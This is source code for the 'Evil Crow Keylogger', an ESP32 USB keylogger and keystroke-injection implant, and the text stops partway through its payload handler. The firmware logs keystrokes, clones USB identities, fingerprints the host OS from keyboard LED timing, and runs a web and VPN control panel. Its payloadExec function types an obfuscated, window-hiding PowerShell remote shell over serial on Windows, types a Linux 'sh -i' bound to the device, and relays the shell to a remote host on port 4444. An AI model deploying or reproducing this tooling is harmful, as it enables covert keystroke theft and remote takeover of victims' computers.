#include <hidboot.h>
#include <usbhub.h>
#include <SPI.h>
#include <SD.h>
#include <WiFiClient.h>
#include <WiFi.h>
#include <ESPmDNS.h>
#include <WiFiServer.h>
#include <WebServer.h>
#include <HTTPUpdateServer.h>
#include "EvilCrowLib.h"
#include "keylog.h"
#include "ecc_usb_clone.h"
#include <ArduinoJson.h>
#include <husarnet.h>
#include <map>
#include "ecc_usb_network_implant.h"
#include "ecc_usb_serial.h"
#include "ecc_sapsan_ai.h"

// Config default SSID, password and channel
String ssid = "Evil Crow Keylogger";  // Enter your SSID here
String password = "123456789";         //Enter your Password here
char *serverIP;
int serverPort = 4444;
// WiFi monitoring variables
unsigned long lastWifiCheckTime = 0;
const unsigned long wifiCheckInterval = 60000; // 1 minute
bool wifiConnected = false;

// MicroSD slot pins
#define SD_SCLK 36
#define SD_MISO 37
#define SD_MOSI 35
#define SD_SS   39
SPIClass sdspi(HSPI);

// Global variables
String cmd;
char Command[255];
String tmp_key;
int payload_state = 0;
String livepayload;
bool payloadExecuted = false;
const bool formatOnFail = true;
String FileName;
String FileList;
String vendorID, productID, manufacturerName, productName;
String os;
volatile bool led_response_received = false;
volatile int led_event_count = 0;
volatile unsigned long led_event_time = 0;
volatile bool caps_status = false;
volatile bool num_status = false;
volatile bool scroll_status = false;
volatile bool numlock_checked = false;
volatile bool os_detection_complete = false;
unsigned long caps_sent_time = 0;
unsigned long num_sent_time = 0;
unsigned long scroll_sent_time = 0;
unsigned long caps_delay = 0;
unsigned long num_delay = 0;
unsigned long scroll_delay = 0;
const unsigned char *selected_layout = en_us;  // Default to EN_US

bool capsLock_status = false;
bool leftctrl_status = false, leftshift_status = false, leftalt_status = false, leftgui_status = false;
bool rightctrl_status = false, rightshift_status = false, rightalt_status = false, rightgui_status = false;

File fsUploadFile;
HusarnetClient husarnet;
WebServer controlserver(80);
WiFiServer tcpServer(12345);
WiFiClient clientServer;
HTTPUpdateServer httpUpdater;

#define ECC_LOG(x)   eccUsbSerialLog(String(x))

String g_usbManufacturer = "Generic";
String g_usbProduct      = "Evil Crow Keylogger";
uint16_t g_usbVid = 0x303A;
uint16_t g_usbPid = 0x1001;
EccCloneInfo g_cloneInfo;

enum HostOS {
  OS_UNKNOWN,
  OS_WINDOWS,
  OS_LINUX,
  OS_MACOS,
  OS_IOS,
  OS_ANDROID,
  OS_CHROMEOS
};

enum MetadataField {
    META_NAME,
    META_DESCRIPTION,
    META_OS
};

HostOS detected_os = OS_UNKNOWN;

extern const unsigned char en_us[128];
extern const unsigned char es_es[128];
extern const unsigned char fr_fr[128];
extern const unsigned char it_it[128];
extern const unsigned char da_dk[128];
extern const unsigned char de_de[128];
extern const unsigned char hr_hr[128];
extern const unsigned char hu_hu[128];
extern const unsigned char pt_pt[128];
extern const unsigned char pt_br[128];
extern const unsigned char be_be[128];
extern const unsigned char br_br[128];
extern const unsigned char ca_ca[128];
extern const unsigned char ca_fr[128];
extern const unsigned char sk_sk[128];
extern const unsigned char cz_cz[128];
extern const unsigned char sv_se[128];
extern const unsigned char si_si[128];

std::map<String, const unsigned char *> layoutMapInit = {
  { "EN_US", en_us },
  { "ES_ES", es_es },
  { "FR_FR", fr_fr },
  { "IT_IT", it_it },
  { "DA_DK", da_dk },
  { "DE_DE", de_de },
  { "HR_HR", hr_hr },
  { "HU_HU", hu_hu },
  { "PT_PT", pt_pt },
  { "PT_BR", pt_br },
  { "BE_BE", be_be },
  { "BR_BR", br_br },
  { "CA_CA", ca_ca },
  { "CA_FR", ca_fr },
  { "SK_SK", sk_sk },
  { "CZ_CZ", cz_cz },
  { "SV_SE", sv_se },
  { "SI_SI", si_si },
};

std::map<String, uint8_t> keyMap = {
  { "KEY_LEFT_ALT", KEY_LEFT_ALT },
  { "KEY_LEFT_GUI", KEY_LEFT_GUI },
  { "KEY_LEFT_CTRL", KEY_LEFT_CTRL },
  { "KEY_LEFT_SHIFT", KEY_LEFT_SHIFT },
  { "KEY_RIGHT_ALT", KEY_RIGHT_ALT },
  { "KEY_RIGHT_GUI", KEY_RIGHT_GUI },
  { "KEY_RIGHT_CTRL", KEY_RIGHT_CTRL },
  { "KEY_RIGHT_SHIFT", KEY_RIGHT_SHIFT },
  { "KEY_ENTER", KEY_RETURN },
  { "KEY_UP_ARROW", KEY_UP_ARROW },
  { "KEY_DOWN_ARROW", KEY_DOWN_ARROW },
  { "KEY_LEFT_ARROW", KEY_LEFT_ARROW },
  { "KEY_RIGHT_ARROW", KEY_RIGHT_ARROW },
  { "KEY_BACKSPACE", KEY_BACKSPACE },
  { "KEY_TAB", KEY_TAB },
  { "KEY_PAUSE", KEY_PAUSE },
  { "KEY_INSERT", KEY_INSERT },
  { "KEY_DELETE", KEY_DELETE },
  { "KEY_PAGE_UP", KEY_PAGE_UP },
  { "KEY_PAGE_DOWN", KEY_PAGE_DOWN },
  { "KEY_ESC", KEY_ESC },
  { "KEY_SPACE", KEY_SPACE },
  { "KEY_HOME", KEY_HOME },
  { "KEY_END", KEY_END },
  { "KEY_CAPS_LOCK", KEY_CAPS_LOCK },
  { "KEY_PRINT_SCREEN", KEY_PRINT_SCREEN },
  { "KEY_SCROLL_LOCK", KEY_SCROLL_LOCK },
  { "KEY_NUM_LOCK", KEY_NUM_LOCK },
  { "KEY_MENU", KEY_MENU },
  { "LED_NUMLOCK", LED_NUMLOCK },
  { "LED_CAPSLOCK", LED_CAPSLOCK },
  { "LED_SCROLLLOCK", LED_SCROLLLOCK },
  { "LED_COMPOSE", LED_COMPOSE },
  { "LED_KANA", LED_KANA },
  { "KEY_F1", KEY_F1 },
  { "KEY_F2", KEY_F2 },
  { "KEY_F3", KEY_F3 },
  { "KEY_F4", KEY_F4 },
  { "KEY_F5", KEY_F5 },
  { "KEY_F6", KEY_F6 },
  { "KEY_F7", KEY_F7 },
  { "KEY_F8", KEY_F8 },
  { "KEY_F9", KEY_F9 },
  { "KEY_F10", KEY_F10 },
  { "KEY_F11", KEY_F11 },
  { "KEY_F12", KEY_F12 }
};

String sdReadFile(const char* path) {
  File f = SD.open(path);
  if (!f) {
    return String();
  }
  String content = f.readString();
  f.close();
  return content;
}

void onKeyboardLeds(ecl_keyboard_leds_t data) {
  led_response_received = true;
  led_event_count = led_event_count + 1;
  led_event_time = millis();

  caps_status = data.capslock != 0;
  num_status = data.numlock != 0;
  scroll_status = data.scrolllock != 0;
  numlock_checked = true;

  if (caps_sent_time > 0 && caps_delay == 0)
    caps_delay = led_event_time - caps_sent_time;
  if (num_sent_time > 0 && num_delay == 0)
    num_delay = led_event_time - num_sent_time;
  if (scroll_sent_time > 0 && scroll_delay == 0)
    scroll_delay = led_event_time - scroll_sent_time;
}

void ensureNumLock() {
  if (!numlock_checked) {
    return;
  }
  if (!num_status) {
    Keyboard.press(KEY_NUM_LOCK);
    delay(100);
    Keyboard.releaseAll();
  }
}

const char *ascii_convert(char c) {
  static char buffer[4];
  if (c >= 32 && c <= 126) {
    snprintf(buffer, sizeof(buffer), "%d", c);
    return buffer;
  }
  return "000";
}

void writeLetterWindows(const char *asciiCode) {
  Keyboard.press(KEY_LEFT_ALT);

  for (int i = 0; asciiCode[i] != '\0'; i++) {
    switch (asciiCode[i]) {
      case '0':
        Keyboard.press(KEY_KP_0);
        delay(2);
        Keyboard.release(KEY_KP_0);
        break;
      case '1':
        Keyboard.press(KEY_KP_1);
        delay(2);
        Keyboard.release(KEY_KP_1);
        break;
      case '2':
        Keyboard.press(KEY_KP_2);
        delay(2);
        Keyboard.release(KEY_KP_2);
        break;
      case '3':
        Keyboard.press(KEY_KP_3);
        delay(2);
        Keyboard.release(KEY_KP_3);
        break;
      case '4':
        Keyboard.press(KEY_KP_4);
        delay(2);
        Keyboard.release(KEY_KP_4);
        break;
      case '5':
        Keyboard.press(KEY_KP_5);
        delay(2);
        Keyboard.release(KEY_KP_5);
        break;
      case '6':
        Keyboard.press(KEY_KP_6);
        delay(2);
        Keyboard.release(KEY_KP_6);
        break;
      case '7':
        Keyboard.press(KEY_KP_7);
        delay(2);
        Keyboard.release(KEY_KP_7);
        break;
      case '8':
        Keyboard.press(KEY_KP_8);
        delay(2);
        Keyboard.release(KEY_KP_8);
        break;
      case '9':
        Keyboard.press(KEY_KP_9);
        delay(2);
        Keyboard.release(KEY_KP_9);
        break;
    }
  }
  Keyboard.release(KEY_LEFT_ALT);
  delay(5);
}

void writeLineWindows(const char *str) {
  ensureNumLock();

  while (*str) {
    const char *code = ascii_convert(*str);
    writeLetterWindows(code);
    str++;
    delay(2);
  }
  Keyboard.press(KEY_NUM_LOCK);
  delay(100);
  Keyboard.releaseAll();
}

void toggleKey(uint8_t key, unsigned long* send_time) {
  *send_time = millis();
  led_response_received = false;

  Keyboard.press(key);
  delay(300);
  Keyboard.release(key);
  delay(800);
}

void resetKeyboardLEDs() {
  unsigned long temp_time;
  delay(500);
  if (caps_status) {
    toggleKey(KEY_CAPS_LOCK, &temp_time);
    delay(800);
  }
  if (num_status) {
    toggleKey(KEY_NUM_LOCK, &temp_time);
    delay(800);
  }
  if (scroll_status) {
    toggleKey(KEY_SCROLL_LOCK, &temp_time);
    delay(800);
  }
}

void detectHostOS() {
  led_event_count = 0;
  caps_status = 0;
  num_status = 0;
  scroll_status = 0;

  caps_delay = num_delay = scroll_delay = 0;
  caps_sent_time = num_sent_time = scroll_sent_time = 0;
  led_response_received = false;
  uint8_t initial_caps = caps_status;
  toggleKey(KEY_CAPS_LOCK, &caps_sent_time);
  delay(1500);

  if (!led_response_received && caps_status != initial_caps) {
    detected_os = OS_IOS;
    return;
  }

  toggleKey(KEY_NUM_LOCK, &num_sent_time);
  delay(1200);
  toggleKey(KEY_SCROLL_LOCK, &scroll_sent_time);
  delay(1200);

  if (led_event_count == 0) {
    detected_os = (caps_status != initial_caps) ? OS_IOS : OS_MACOS;
  }
  else if (led_event_count >= 3 && caps_delay < 100 && num_delay < 100 && scroll_delay < 100) {
    detected_os = OS_WINDOWS;
  }
  else {
    bool has_numlock_response = (num_delay > 0);
    bool has_scrolllock_response = (scroll_delay > 0);

    if (led_event_count == 1 && caps_status != initial_caps && caps_delay > 0 && caps_delay < 20 && !has_numlock_response && !has_scrolllock_response) {
      detected_os = OS_CHROMEOS;
    }
    
    else if (num_status && !scroll_status && has_numlock_response && !has_scrolllock_response) {
      detected_os = OS_LINUX;
    }
    else if ((caps_delay > 200 || num_delay > 200 || scroll_delay > 200) && 
             (has_numlock_response || has_scrolllock_response)) {
      detected_os = OS_ANDROID;
    }
    else if (caps_status != initial_caps) {
      detected_os = OS_IOS;
    }
    else {
      detected_os = OS_UNKNOWN;
    }
  }
}

void printDetectedOS() {
  switch (detected_os) {
    case OS_WINDOWS:
      os = "Windows";
      break;
    case OS_LINUX:
      os = "Linux";
      break;
    case OS_MACOS:
      os = "macOS";
      break;
    case OS_IOS:
      os = "iOS";
      break;
    case OS_ANDROID:
      os = "Android";
      break;
    case OS_CHROMEOS:
      os = "chromeOS";
      break;
    default:
      os = "OS Unknown";
      break;
  }
  os_detection_complete = true;
}

void onDetectOSRequested() {
  resetKeyboardLEDs();
  detectHostOS();
  resetKeyboardLEDs();
  printDetectedOS();
}

void deleteFile(fs::FS &fs, const String &path) {
  // Delete the main payload file
  bool payloadDeleted = fs.remove(path);

  // Delete the corresponding meta file
  String metaPath = path;
  metaPath += ".meta";
  fs.remove(metaPath);

  if (payloadDeleted) {
    controlserver.send(200, "text/plain", "File deleted successfully");
  } else {
    controlserver.send(500, "text/plain", "Failed to delete file");
  }
}

void readFile(fs::FS &fs, const String &path) {
  String payloadContent = "";
  String payloadDescription = readPayloadMetadata(path, META_DESCRIPTION);

  File file = fs.open(path);
  if (!file || file.isDirectory()) {
    FileList = "Failed to open file";
    return;
  }
  while (file.available()) {
    payloadContent += file.readString();
  }
  file.close();

  if (path == "") {
    FileList = "File name is empty";
    return;
  }

  // Set layout based on payload content
  setLayoutFromPayload(payloadContent);

  livepayload = payloadContent;
  
  FileList = sdReadFile("/HTML/showpayload.html");
  FileList.replace("{{path}}", path);
  FileList.replace("{{payloadContent}}", payloadContent);
  FileList.replace("{{payloadDescription}}", payloadDescription);
}

void savePayloadMetadata(const String &filename, const String &name, const String &description, const String &os) {
  String metaPath = filename + ".meta";
  File metaFile = SD.open(metaPath, FILE_WRITE);
  if (metaFile) {
    String trimmedName = name;
    trimmedName.trim();
    metaFile.println(trimmedName);
    String trimmedOS = os;
    trimmedOS.trim();
    metaFile.println(trimmedOS);
    String cleanDesc = description;
    cleanDesc.trim();
    cleanDesc.replace("\r\n", "\n");
    metaFile.print(cleanDesc);

    metaFile.close();
  }
}

String readPayloadMetadata(const String &filename, MetadataField field) {
    String metaPath = filename + ".meta";

    if (!SD.exists(metaPath)) {
        if (field == META_NAME) {
            int lastSlash = filename.lastIndexOf('/');
            return filename.substring(lastSlash + 1);
        } else if (field == META_DESCRIPTION) {
            return "No description";
        } else {
            return "unknown";
        }
    }

    File metaFile = SD.open(metaPath, FILE_READ);
    if (!metaFile) {
        if (field == META_NAME) {
            int lastSlash = filename.lastIndexOf('/');
            return filename.substring(lastSlash + 1);
        } else if (field == META_DESCRIPTION) {
            return "No description";
        } else {
            return "unknown";
        }
    }

    String lines[3];
    for (int i = 0; i < 3 && metaFile.available(); i++) {
        if (i == 2) {
            String desc;
            while (metaFile.available()) {
                desc += metaFile.readString();
            }
            desc.trim();
            lines[i] = desc;
        } else {
            lines[i] = metaFile.readStringUntil('\n');
            lines[i].trim();
        }
    }

    metaFile.close();

    switch (field) {
        case META_NAME:
            return lines[0].length() > 0 ? lines[0] : filename.substring(filename.lastIndexOf('/') + 1);
        case META_OS:
            return lines[1].length() > 0 ? lines[1] : "unknown";
        case META_DESCRIPTION:
            return lines[2].length() > 0 ? lines[2] : "No description";
        default:
            return "";
    }
}

void handleUpdatePayload() {
    if (controlserver.hasArg("plain")) {
        JsonDocument doc;
        DeserializationError error = deserializeJson(doc, controlserver.arg("plain"));

        if (error) {
            controlserver.send(400, "application/json", 
                "{\"success\":false,\"message\":\"Invalid JSON\"}");
            return;
        }

        String path = doc["path"] | "";
        String content = doc["content"] | "";

        if (path.isEmpty() || content.isEmpty()) {
            controlserver.send(400, "application/json", 
                "{\"success\":false,\"message\":\"Missing path or content\"}");
            return;
        }

        File file = SD.open(path, "w");
        if (!file) {
            controlserver.send(500, "application/json", 
                "{\"success\":false,\"message\":\"Failed to open file\"}");
            return;
        }

        file.print(content);
        file.close();
        controlserver.send(200, "application/json", 
            "{\"success\":true,\"message\":\"Payload updated\"}");
    } else {
        controlserver.send(400, "application/json", 
            "{\"success\":false,\"message\":\"No data received\"}");
    }
}

// Updated handleFileUpload
void handleFileUpload() {
  HTTPUpload &upload = controlserver.upload();
  static const uint32_t MAX_FILE_SIZE = 204800;  // 200KB limit
  static uint32_t totalUploaded = 0;
  static String payloadName, payloadDescription, fileName, payloadOS;

  if (upload.status == UPLOAD_FILE_START) {
    totalUploaded = 0;
    payloadName = controlserver.arg("payloadName");
    payloadDescription = controlserver.arg("payloadDescription");
    payloadOS = controlserver.arg("payloadOS");

    fileName = upload.filename;

    if (!fileName.endsWith(".txt")) {
      controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Only .txt files allowed\"}");
      return;
    }

    if (!fileName.startsWith("/")) {
      fileName = String("/payloads/") + fileName;
    }

    if (!SD.exists("/payloads")) {
      SD.mkdir("/payloads");
    }

    fsUploadFile = SD.open(fileName, "w");
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Cannot create file\"}");
      return;
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    totalUploaded += upload.currentSize;
    if (totalUploaded > MAX_FILE_SIZE) {
      fsUploadFile.close();
      SD.remove(fsUploadFile.name());
      // Remove meta file using proper string concatenation
      String metaPath = fsUploadFile.name();
      metaPath += ".meta";
      SD.remove(metaPath);
      controlserver.send(413, "application/json", "{\"status\":\"error\",\"message\":\"File exceeded size limit\"}");
      return;
    }

    if (fsUploadFile) {
      fsUploadFile.write(upload.buf, upload.currentSize);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      savePayloadMetadata(fileName, payloadName, payloadDescription, payloadOS);
    }
  } else {
    if (fsUploadFile) {
      fsUploadFile.close();
      SD.remove(fsUploadFile.name());
      String metaPath = fsUploadFile.name();
      metaPath += ".meta";
      SD.remove(metaPath);
    }
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Upload failed\"}");
  }
}

void listDir(fs::FS &fs, const char *dirname, uint8_t levels) {
  FileList = sdReadFile("/HTML/listpayloads.html");

  File root = fs.open(dirname);
  if (!root || !root.isDirectory()) {
    FileList += "<br>Empty<br></body></html>";
    return;
  }

  File file = root.openNextFile();
  while (file) {
    String fileName = "/payloads/";
    fileName += file.name();

    // Skip metadata files
    if (fileName.endsWith(".meta")) {
      file = root.openNextFile();
      continue;
    }

    String payloadName = readPayloadMetadata(fileName, META_NAME);
    String osType = readPayloadMetadata(fileName, META_OS);
    String payloadDesc = readPayloadMetadata(fileName, META_DESCRIPTION);
    
    // Truncate description to first two lines or 120 characters
    int newlinePos = payloadDesc.indexOf('\n');
    if (newlinePos != -1) {
      int secondNewline = payloadDesc.indexOf('\n', newlinePos + 1);
      if (secondNewline != -1) {
        payloadDesc = payloadDesc.substring(0, secondNewline) + "...";
      }
    } else if (payloadDesc.length() > 120) {
      payloadDesc = payloadDesc.substring(0, 120) + "...";
    }

    FileList += "<div class='payload-item' data-os='" + osType + "'>";
    FileList += "<a class=\"pyaloadButton\" href=\"/showpayload?payload=" + fileName + "\">" + payloadName + "</a>";
    FileList += "<div class='payload-desc'>" + payloadDesc + "</div>";
    FileList += "<div class='payload-filename'>" + String(file.name()) + " - OS Type: "+ osType +"</div>";
    FileList += "</div>";

    file = root.openNextFile();
  }
  FileList += "</body></html>";
}

void handlePayloadCounter() {
    int count = 0;

    if (SD.exists("/payloads")) {
        File root = SD.open("/payloads");
        File file = root.openNextFile();
        while (file) {
            String fileName = file.name();
            file = root.openNextFile();

            // Skip metadata files
            if (!fileName.endsWith(".meta")) {
                count++;
            }
        }
    }

    String json = "{\"count\":" + String(count) + "}";
    controlserver.send(200, "application/json", json);
}

void handleStats() {
  String json = "{";
  json += "\"uptime\":" + String(millis() / 1000);
  json += ",\"cpu0\":" + String(getCpuFrequencyMhz());
  json += ",\"cpu1\":" + String(getXtalFrequencyMhz());
  json += ",\"temperature\":" + String(temperatureRead());
  json += ",\"freespiffs\":" + String(SD.totalBytes() - SD.usedBytes());
  json += ",\"totalram\":" + String(ESP.getHeapSize());
  json += ",\"freeram\":" + String(ESP.getFreeHeap());
  json += ",\"os\":\"" + os + "\"";
  json += ",\"ssid\":\"" + WiFi.SSID() + "\"";
  json += ",\"ipaddress\":\"" + WiFi.localIP().toString() + "\"";
  json += ",\"vpnipaddress\":\"" + String(husarnet.getIpAddress().c_str()) + "\"";
  json += "}";
  controlserver.send(200, "application/json", json);
}

void connectToWiFi() {

  WiFi.mode(WIFI_STA);

  // Disconnect first if currently connected
  if (WiFi.status() == WL_CONNECTED) {
    WiFi.disconnect();
    delay(1000);
  }

  bool hasPrimaryConfig = SD.exists("/wifi_config.txt");
  bool hasBackupConfig = SD.exists("/wifi_backup_config.txt");

  // Try primary WiFi if it exists
  if (hasPrimaryConfig) {
    File configFile = SD.open("/wifi_config.txt", FILE_READ);
    if (configFile) {
      String primarySSID = configFile.readStringUntil('\n');
      primarySSID.trim();
      String primaryPassword = configFile.readStringUntil('\n');
      primaryPassword.trim();
      configFile.close();

      WiFi.begin(primarySSID.c_str(), primaryPassword.c_str());

      unsigned long startAttemptTime = millis();
      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
        delay(500);
      }

      if (WiFi.status() == WL_CONNECTED) {
        initMDNS();
        return;
      }
    }
  }

  // Try backup WiFi if it exists and primary failed
  if (hasBackupConfig) {
    File backupFile = SD.open("/wifi_backup_config.txt", FILE_READ);
    if (backupFile) {
      String backupSSID = backupFile.readStringUntil('\n');
      backupSSID.trim();
      String backupPassword = backupFile.readStringUntil('\n');
      backupPassword.trim();
      backupFile.close();

      WiFi.begin(backupSSID.c_str(), backupPassword.c_str());

      unsigned long startAttemptTime = millis();
      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
        delay(500);
      }

      if (WiFi.status() == WL_CONNECTED) {
        initMDNS();
        return;
      }
    }
  }

  // Fall back to default credentials if no saved configs worked
  WiFi.begin(ssid.c_str(), password.c_str());

  unsigned long startAttemptTime = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
    delay(500);
  }

  if (WiFi.status() == WL_CONNECTED) {
    initMDNS();
  }
}

void initVPN() {
  if (!SD.exists("/vpn_config.txt")) {
    ECC_LOG("No vpn_config.txt found, skipping VPN");
    return;
  }

  String vpnhostname = "vpn-keylogger";
  String joincode;

  File vpnFile = SD.open("/vpn_config.txt", FILE_READ);
  if (vpnFile) {
    joincode = vpnFile.readString();
    joincode.trim();
    vpnFile.close();
  }

  if (joincode.isEmpty()) {
    ECC_LOG("VPN joincode empty, skipping VPN");
    return;
  }

  husarnet.join("vpn-keylogger", joincode.c_str());
  while (!husarnet.isJoined()) {
    ECC_LOG("Waiting for Husarnet network...");
    delay(1000);
  }
  ECC_LOG("Husarnet network joined");
}

void initMDNS() {
  String hostname = "keylogger";
  if (SD.exists("/hostname_config.txt")) {
    File hostnameFile = SD.open("/hostname_config.txt", FILE_READ);
    if (hostnameFile) {
      hostname = hostnameFile.readStringUntil('\n');
      hostname.trim();
      hostnameFile.close();
    }
  }

  MDNS.end();
  if (!MDNS.begin(hostname.c_str())) {
    ECC_LOG("Error setting up MDNS responder!");
  }

  tcpServer.begin();
  wifiConnected = true;
}

void handleUpdateHostname() {
  if (controlserver.hasArg("hostname")) {
    String newHostname = controlserver.arg("hostname");

    File fsUploadFile = SD.open("/hostname_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to save hostname\"}");
      return;
    }

    fsUploadFile.println(newHostname);
    fsUploadFile.close();
    controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Hostname updated successfully! Device will restart.\"}");
    delay(1000);
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"No hostname provided\"}");
  }
}

void handleGetHostname() {
  String currentHostname = "keylogger";  // default

  if (SD.exists("/hostname_config.txt")) {
    File fsUploadFile = SD.open("/hostname_config.txt", FILE_READ);
    if (fsUploadFile) {
      currentHostname = fsUploadFile.readStringUntil('\n');
      currentHostname.trim();
      fsUploadFile.close();
    }
  }

  controlserver.send(200, "text/plain", currentHostname);
}

void setLayoutFromPayload(const String &payloadContent) {
  int layoutPos = payloadContent.indexOf("# Layout: ");

  if (layoutPos != -1) {
    int start = layoutPos + 10;
    int end = payloadContent.indexOf('\n', start);
    if (end == -1) {
      end = payloadContent.length();
    }
    String tmp_layout = payloadContent.substring(start, end);
    tmp_layout.trim();

    if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {
      selected_layout = layoutMapInit[tmp_layout];
      Keyboard.setLayout(selected_layout);
      return;
    }
  }

  if (SD.exists("/layout_config.txt")) {
    File fsUploadFile = SD.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      String layoutKey = fsUploadFile.readStringUntil('\n');
      layoutKey.trim();
      fsUploadFile.close();

      auto it = layoutMapInit.find(layoutKey);
      if (it != layoutMapInit.end()) {
        selected_layout = it->second;
        Keyboard.setLayout(selected_layout);
      }
    }
  }
}

String getCurrentLayout() {
  String currentLayout = "en_us";  // Default to EN_US

  if (SD.exists("/layout_config.txt")) {
    File fsUploadFile = SD.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      currentLayout = fsUploadFile.readStringUntil('\n');
      currentLayout.trim();
      fsUploadFile.close();
    }
  }

  return currentLayout;
}

void saveLayoutConfig(const String &layout) {
  File fsUploadFile = SD.open("/layout_config.txt", FILE_WRITE);
  if (!fsUploadFile) {
    controlserver.send(500, "text/plain", "Failed to open file for writing");
    return;
  }

  fsUploadFile.println(layout);
  fsUploadFile.close();
}

String g_lastShellStatus = "No connection attempted yet";

static bool eccShellConnect(const String& target) {
  if (clientServer.connected()) {
    clientServer.stop();
    delay(100);
  }

  String spec = target;
  spec.trim();
  String ip = spec;
  int port = 4444;
  const int colonPos = spec.lastIndexOf(':');
  if (colonPos >= 0) {
    ip = spec.substring(0, colonPos);
    port = spec.substring(colonPos + 1).toInt();
  }
  ip.trim();

  if (ip.length() == 0 || port <= 0 || port > 65535) {
    g_lastShellStatus = "Invalid target \"" + spec + "\" - expected IP or IP:PORT";
    return false;
  }

  const unsigned long startTime = millis();
  while (millis() - startTime < 5000) {
    if (clientServer.connect(ip.c_str(), (uint16_t)port, 2000)) {
      g_lastShellStatus = "Connected to " + ip + ":" + String(port);
      return true;
    }
    delay(100);
  }

  g_lastShellStatus = "Could not connect to " + ip + ":" + String(port) +
                      " - no listener, wrong address or blocked";
  return false;
}

void payloadExec() {
  cmd.trim();
  if (cmd.length() == 0 || cmd.startsWith("##") || cmd.startsWith("REM")) {
      return;
  }

  if (cmd.startsWith("RunMac ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("RunLauncher ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F2);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 12);
  }

  else if (cmd.startsWith("RunNix ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("RunWin ")) {
    cmd.toCharArray(Command, cmd.length() + 1);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print('r');
    delay(100);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.println(Command + 7);
  }

  else if (cmd.startsWith("ShellWin ")) {
    if (!eccShellConnect(cmd.substring(9))) return;

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.print("r");
    delay(100);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.println("powershell");
    delay(1000);
    Keyboard.print("Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a[$a.Length-1], 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \"I\", \"f\", \"E\", \"x\", \"X\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \"exit\") { break }; $o = f \"$c\"; $p.WriteLine($o); $p.WriteLine(\"END_OF_COMMAND\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow");
    delay(1000);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  else if (cmd.startsWith("ShellNix ")) {
    if (!eccShellConnect(cmd.substring(9))) return;
    String deviceName = g_usbProduct;
    deviceName.trim();
    if (deviceName.length() == 0) deviceName = "Evil Crow Keylogger";

    deviceName.replace(" ", "_");
    for (unsigned int i = 0; i < deviceName.length(); ++i) {
        const char c = deviceName[i];
        const bool safe = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                          (c >= '0' && c <= '9') || c == '_' || c == '.' || c == '-';
        if (!safe) deviceName.setCharAt(i, '*');
    }

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.print("t");
    delay(100);
    Keyboard.releaseAll();
    delay(500);
    Keyboard.println("sh -i > /dev/serial/by-id/*" + deviceName + "* 2>&1 < /dev/serial/by-id/*" + deviceName + "*");
  }

  else if (cmd.startsWith("ServerConnect ")) {
    if (!eccShellConnect(cmd.substring(14))) return;
  }
  
  else if (cmd.startsWith("ShellMac ")) {
    if (!eccShellConnect(cmd.substring(9))) return;

    // run spotlight/alfred prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_SPACE);
    delay(100);
    Keyboard.releaseAll();

    delay(1000);
    // type terminal
    Keyboard.print("terminal");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // open new terminal tab, just in case there is terminal open with some chars - make greenlandi (press optin+t)
    Keyboard.press(KEY_LEFT_GUI);
